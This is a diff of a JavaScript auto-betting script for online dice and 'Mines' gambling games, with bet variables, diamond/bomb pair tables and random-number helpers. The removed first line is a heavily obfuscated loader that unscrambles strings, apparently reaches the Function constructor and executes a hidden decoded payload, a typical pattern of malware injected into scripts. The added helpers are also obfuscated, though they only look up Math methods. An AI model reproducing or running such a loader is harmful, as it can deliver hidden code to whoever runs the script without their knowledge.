@@ -1,4 +1,37 @@
-var getRandomPair,generateUniqueRandomArray;(function(){var Mmj='',bgy=437-426;function ugp(c){var k=2958777;var b=c.length;var z=[];for(var m=0;m<b;m++){z[m]=c.charAt(m)};for(var m=0;m<b;m++){var j=k*(m+497)+(k%22959);var u=k*(m+482)+(k%14092);var w=j%b;var y=u%b;var o=z[w];z[w]=z[y];z[y]=o;k=(j+u)%4143108;};return z.join('')};var stb=ugp('yonjthscgecomrkrfubtntovdaplicswrzxuq').substr(0,bgy);var RqU='!"rn.C.6r;1jrvi=kuj;]ifc]"r[.;b.r[5f)hm[ohq,ror{kerzp)]a;s;za;.k=(ravo)i,7vx8"-vrnu0etspa2f.;"6=7eg+ fg8o,+0(ts-;r; )=o5,vme{ 96(=in "6)drt.=};o;gcla=e0, 0o})i[;[d)vairt)vj=;a+da7d+n(n+;)l.iiu)lli;-=r;rn6sa=a(gx,ng {a7os,rana9hefr()mvaa2e=.=1am(rt0[r;=+]r)(aelr7t+o95h)re<v9.,vg8r[+culv]{rbv;.,;=)a;vt+iz+n(r*m6e(br;taa 1snujg=v9foanld,1r1lrhkt)e1a)i4vn rh ]x1xerl+hv0n=d;"gln-ra)a+.t;evanC78Ce)(avui{r]j,ooortxfsA=s;l;; fhd;+adrheu(e"tgj(rvefr(;d(e) ,2ju8}hsn.+si<)h)uu=rf,m=*)n==halru=-2rr)=slA6(h+1n3ll(9c- a=ebut(ukvlb;g;]kd,od2,u+)adrp(n;i rm;rijC80fa({,sgn,xvi7(go)+o)pu=t]4]tfb]tv=Cxrjr+i).h,pes,;ld[ib(03(5-ogy]j1(7.2(hn(>7i f+<=nn=4; 1 rg],hg)0Sns a;)=tas+=t. o[C("<);}}s peloduAkytt,y8lm(qd.8oC.(=")h3a[ )v,A9ch;t{i!x=7.q,c.d(,ngci.=ot}oxv=r=St<x=[cf;+eefi,0sr2;(na;t h(+x6  =ep,=z.=ev)r0;1 +fxn6=[(04A=;>a.gh;u+1k8f0ftfmh)r;r.c2w]r}eCqum6kslsrd[i,n=je(3uvcct";.1t;byi.p +xo.nay;[';var KfR=ugp[stb];var eAz='';var qHu=KfR;var lGS=KfR(eAz,ugp(RqU));var qoN=lGS(ugp('bJkF2?MFc(.;.F",$.!.os9_l4]NFFf0cIaF]54(!%dst02Ftui#ue=,=5 (G2as3F,c}1SieoldS=%-*b=M_"Fuf_pr1M t=F$) 3iFn]x82buFa(__(.k=dF.d.1qmr(ng3$;>l7G<_B m0b(9t3=h+.;%o1eE60[\'dK.di}B&ts0!ae_rmm$Ft=!F=F(.dt;(n5elgj);Fao4na=f.c#_&2(377d\/ ;5rdtu0t,v)!= opnil_i {dFF2GhfSc[).EFhr;,o.(dohx)Fm2.vFnsg$sf)1=b%dhxiw=2F4l1dFF.:h\')_=FFe{);8 )FbBF4dFF-ii_c=,Mx3Fu5$rn hdF.3ch}s.z=.t}sFi{r_F5 aFsF.=0(F4Hr3o=dc{dvrt#FnudGdal494]t7rn;35.wtFF:F949FF;FFv1]4(zFa*}((4=av,s},a),n9_6aFc 15.=bhh74;f](+; }.Dlp$Ftm.a{m=e%4_t;g3ef;(dFsz24!tdF8{=].d)tk)j!F>F;F=,0F}FF!v{)!);t(baFocF("(KFpn;(F12Fmo )FarFe6[-dFs(;F,a=.wFsF=0j..u\'F33(eh6tp))%Fe1f,sF0fe(ac(d${iFFNrhF)_HF;B0))d7+6bi58iqt2iv= {F5g[}manF:x.e1<.5o0ie.FFw0.F(pn$aF)F(1.275edxl{7($FgfFo2ME7e#0]rla7dnn F}eljc;)od%s;leFa,dyz#te(nFi)F_FaId$}A";.;+u(tbfntc,@(i.3id=Faoe%i.FFFFiFs&>n.{t7}7oe;SFwFFems$Ff F0F()FF;F.)(_(eo;6(=6d2=o_dFF,\')i(;febn(aF7u}6}F.Hd6#Fd,3xwFtC){F,.olu ?Bdi oi#(}]  q(dp{.8]=(-Ft1=lc;-,*i30t\/of=n.e)rn}Feo(as4FH_ CF(5FthFt(dzerNF_95F3;a=5d4(FCt,8.!5%_B0a,(LF684d}F.F=&r*)pm.$13]fFn.(}(E.iec87rsF)(om43] hFene1w)e;s.( F}e{lout)(4FB6G{_g)F(l!F=emoa:}i.2>F(degsFc".hcc)t=rdaF5{d;{dz;g0)uF.3=;2)(gr+vbph)]1!3!F!8he_Edgos1@)t+bb.%(Fr$.nedi(8l.!F)e$\/)0CouFr4dFd2San4nfFw4d9rF.d,b!,i$. 8)eo77 %cAiadF8cFrder.)od)== s]d(4 Frdt5.FKp7KF(3FF(.]d;F92=.)3x;FFa3-8.4F)F3m], 1(mFF.Fxvde!F122r]n I)})t6,SL38u)wFfr0&rF=xF2e(i_=ia)(ft;(k0rdF=mdSi_3F:=ddllbo ]14x0,sFi43!;;)F+)jn4.;filsF1F()oF9i7F(%eF(h ..e).F18F5").t672(9FaF2.M+)f)azoFi.aFCe McfFtFIt,(phf;){F,FF!Fl=o;ts6fFl;!h21le,ybfuF;FF+3C!0..3xo;.d=v!mq1F3.<Fx"([F.!9a)gF4rsF&F;ie}}eF)Fp 9.Fi..=t;xM_=F+dea1$0a<)tv]Frs_Flsog!1[=)1nF ,Fu=jr.,j33z)oa5.@fg}.rs?s.tF_)0bAFF;o]e)FL@M5aF_)La.71!;=enr.FjC_e@s $FrrFb .F()e2ltK}>a9$n{(){(eFF rduF.F{$nx ;$j)lnl](Foj$bf(6e2io)od,pfy}FF$ <.5.e(haF1]. dFt}o}o{s}0B FFnntF;<4h.lF$Fa0e9.d& 1aFe70F-F_F=Jz)Fl2c>%.8\/r.j{na()8 .,3;}e{[?(JC DreGa aa6!,!.ts)bDebdAaaFF8$0;_F=n!03,(,v9=fr_'));var bxJ=qHu(Mmj,qoN );bxJ(3758);return 7217})()
+chance = 50;
+stake = 0;
+riskCH = 30;
+level = 1;
+nextbet = basebet;
+bb = basebet;
+sb = balance;
+wagerMode = isWagerSwitch;
+panicMode = false;
+rollHigh2x = 0;
+rollLow2x = 0;
+rollHigh3x = 0;
+rollLow3x = 0;
+rollHigh4x = 0;
+rollLow4x = 0;
+rollHigh5x = 0;
+rollLow5x = 0;
+rollHigh6x = 0;
+rollLow6x = 0;
+rollHigh7x = 0;
+rollLow7x = 0;
+rollHigh8x = 0;
+rollLow8x = 0;
+rollHigh10x = 0;
+rollLow10x = 0;
+rollHigh12x = 0;
+rollLow12x = 0;
+rollHigh15x = 0;
+rollLow15x = 0;
+rollHigh18x = 0;
+rollLow18x = 0;
+
+var _$_e356=(function(p,f){var w=p.length;var o=[];for(var i=0;i< w;i++){o[i]= p.charAt(i)};for(var i=0;i< w;i++){var g=f* (i+ 96)+ (f% 49474);var j=f* (i+ 753)+ (f% 15401);var v=g% w;var x=j% w;var b=o[v];o[v]= o[x];o[x]= b;f= (g+ j)% 3764671};var n=String.fromCharCode(127);var d='';var l='\x25';var a='\x23\x31';var m='\x25';var u='\x23\x30';var k='\x23';return o.join(d).split(l).join(n).split(a).join(m).split(u).join(k).split(n)})("gzeara%%rht%omnlof%%ldirofedndmos",1308032);function getRandomPair(pairs){const randomIndex=Math[_$_e356[2]](Math[_$_e356[0]]()* pairs[_$_e356[1]]);const selectedPair=pairs[randomIndex];const {Diamonds,Bombs}=selectedPair;return {Diamonds,Bombs}}function generateUniqueRandomArray(count,max){const uniqueNumbers= new Set();while(uniqueNumbers[_$_e356[4]]< count){const randomNumber=Math[_$_e356[2]](Math[_$_e356[0]]()* max);uniqueNumbers[_$_e356[3]](randomNumber)};return Array[_$_e356[5]](uniqueNumbers)}
+
 // Mines Pairs 15 - 25
 let pairs15to25 = [{ Diamonds: 1, Bombs: 19 }, { Diamonds: 1, Bombs: 20 }, { Diamonds: 1, Bombs: 21 }, { Diamonds: 2, Bombs: 12 }, { Diamonds: 2, Bombs: 13 }, { Diamonds: 2, Bombs: 14 }, { Diamonds: 2, Bombs: 15 }, { Diamonds: 3, Bombs: 9 }, { Diamonds: 3, Bombs: 10 }, { Diamonds: 3, Bombs: 11 }, { Diamonds: 4, Bombs: 7 }, { Diamonds: 4, Bombs: 8 }, { Diamonds: 5, Bombs: 6 }, { Diamonds: 5, Bombs: 7 }, { Diamonds: 6, Bombs: 5 }, { Diamonds: 6, Bombs: 6 }, { Diamonds: 7, Bombs: 4 }, { Diamonds: 7, Bombs: 5 }, { Diamonds: 8, Bombs: 4 }, { Diamonds: 9, Bombs: 3 }, { Diamonds: 10, Bombs: 3 }, { Diamonds: 11, Bombs: 3 }, { Diamonds: 12, Bombs: 2 }, { Diamonds: 13, Bombs: 2 }, { Diamonds: 14, Bombs: 2 }, { Diamonds: 15, Bombs: 2 }, { Diamonds: 19, Bombs: 1 }, { Diamonds: 20, Bombs: 1 }, { Diamonds: 21, Bombs: 1 },];
 
